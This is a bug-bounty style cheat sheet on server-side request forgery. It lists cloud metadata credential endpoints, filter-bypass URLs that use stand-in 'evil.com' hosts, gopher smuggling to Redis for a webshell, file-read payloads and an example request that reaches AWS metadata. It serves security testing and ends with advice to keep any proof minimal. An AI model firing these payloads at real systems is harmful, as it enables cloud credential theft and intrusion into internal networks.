# Server-Side Request Forgery (SSRF)

**What it is:** Server fetches a URL you control → reach internal services, cloud metadata, port-scan the intranet.

## Where to look
URL params (`url=`, `image=`, `callback=`, `webhook=`, `feed=`, `proxy=`, `dest=`), PDF/HTML-to-image renderers, avatar-from-URL, webhooks, import-from-URL, SSO/OIDC `redirect`/`jwks_uri`, XML/SVG (see XXE), file preview.

## Test steps
- [ ] Point to your Collaborator/interactsh → confirm server-side fetch (check source IP).
- [ ] Cloud metadata:
```
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
       (IMDSv2 needs token header — try, note if blocked)
GCP:   http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Metadata:true)
```
- [ ] Internal: `http://localhost:port`, `http://127.0.0.1`, `http://192.168.x.x`, `http://[::1]`.
- [ ] Scan internal ports via response/time differences.

## Bypass filters
- Alt IP: decimal `2130706433`, octal `0177.0.0.1`, hex `0x7f.0.0.1`, `127.1`, `[::ffff:127.0.0.1]`.
- DNS rebinding, `localtest.me`/`nip.io` (`127.0.0.1.nip.io`).
- Redirect: your server 302s to `169.254.169.254`.
- Enclosed alnum / userinfo trick: `http://expected.com@evil.com`, `http://evil.com#expected.com`.
- Scheme swap: `gopher://` (protocol smuggling to Redis/SMTP), `file://`, `dict://`.

## IMDSv2 & container nuances (2024–2025 reality)
IMDSv2 is now common and blocks naive SSRF because token fetch needs a **PUT + custom header**, and it **rejects requests carrying `X-Forwarded-For`** (defeats proxy-relayed SSRF). Still exploitable when:
- [ ] **IMDSv1 left enabled** (fallback) → plain `GET` to `/latest/meta-data/...` works.
- [ ] The SSRF primitive can send **PUT + arbitrary headers** (full-request SSRF, some fetch/webhook libs):
```
PUT /latest/api/token   header: X-aws-ec2-metadata-token-ttl-seconds: 21600
GET /latest/meta-data/iam/security-credentials/<role>   header: X-aws-ec2-metadata-token: <token>
```
- [ ] **`HttpPutResponseHopLimit` too high** in containers → metadata reachable from the pod.
- [ ] **ECS/Fargate task-role creds** (no IMDS needed):
```
http://169.254.170.2/v2/credentials/<GUID>            (URI from $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
http://169.254.170.2/v2/metadata
```
- [ ] **Kubernetes/cloud internal:** `http://kubernetes.default.svc`, kubelet `:10250`, cloud-internal APIs.

## Impact
Cloud cred theft (→ account takeover), internal service access, RCE via gopher→internal service.

## Tools
Collaborator/interactsh, `SSRFmap`, `gopherus`, Burp.

## 🎯 PoC — Request → Response

**Webhook/URL param fetched server-side → point at metadata:**
```http
POST /api/v2/integrations/webhook/test HTTP/2
Host: api.target.com
Authorization: Bearer <mine>
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```
```http
HTTP/2 200 OK
Content-Type: application/json

{"status":200,"body":"s3-readonly-role"}      ← server reached AWS metadata
```
Confirm reach without touching creds — a Collaborator variant:
```http
{"url":"http://COLLAB.oastify.com/ssrf-proof"}
```
```
Collaborator: HTTP GET /ssrf-proof from 52.x.x.x (target egress IP) = server-side fetch confirmed
```

## More cloud metadata endpoints
```
DigitalOcean: http://169.254.169.254/metadata/v1/    (user-data, tokens)
Alibaba:      http://100.100.100.200/latest/meta-data/
Oracle OCI:   http://169.254.169.254/opc/v2/instance/   (Authorization: Bearer Oracle)
Hetzner:      http://169.254.169.254/hetzner/v1/metadata
GCP recursive:http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json  (Metadata-Flavor: Google)
K8s:          https://kubernetes.default.svc/api  ; kubelet :10250/run/... (RCE if open)
```

## Deep cuts — turn a fetch into real impact
- [ ] **Gopher → protocol smuggling (blind→RCE):** `gopherus` builds `gopher://127.0.0.1:6379/_` (Redis `CONFIG SET dir`/webshell/SLAVEOF), `:11211` (Memcached), `:3306` (MySQL), `:25` (SMTP send mail). One-shot RCE when an internal service has no auth.
- [ ] **Headless-renderer SSRF (PDF/HTML-to-image):** the Chrome/wkhtmltopdf/Puppeteer backend fetches `file:///etc/passwd`, `http://169.254.169.254`, and follows `<iframe>`/`<img>`/`@import`/`<script>` — inject those into the HTML you control. Also `<link rel=dns-prefetch>` for blind OOB.
- [ ] **Follow-redirect bypass:** allow-list checks *your* URL, then follows a 302 to `169.254.169.254`/internal. Or DNS-rebind: your host resolves public on validation, private on fetch (`09-advanced/06`).
- [ ] **Allow-list defeats:** `http://expected.com@169.254.169.254`, `http://169.254.169.254#expected.com`, `http://expected.com.evil.com`, unicode/IDN homoglyph, `[::ffff:169.254.169.254]`, `0`, decimal/octal/hex IP, trailing dot, DNS wildcard `169.254.169.254.nip.io`.
- [ ] **Blind port scan / internal recon:** time or status differences per `host:port`; enumerate `127.0.0.1:1-65535`, then hit discovered admin panels (Jenkins, Actuator, Kibana, Consul, etcd, Docker `:2375`).
- [ ] **SSRF via SVG/XML/XXE** (`05`) and via **webhooks/OIDC `jwks_uri`/`request_uri`** — the server fetches your JWKS/OpenID config; point it internal.
- [ ] **Second-order / stored SSRF:** save a URL (avatar, webhook, feed) that a *worker* fetches later from a different, less-filtered network zone.
- [ ] **DNS-rebinding automation:** `rbndr`, `singularity`, `nip.io`/`sslip.io` + short TTL for TOCTOU between validation and fetch.

## Report notes
Prove with a Collaborator hit from the server IP, or read a non-sensitive metadata path. Do not exfil live IAM creds beyond minimal proof. If chained to an internal service, show the reached banner, not the exploitation.
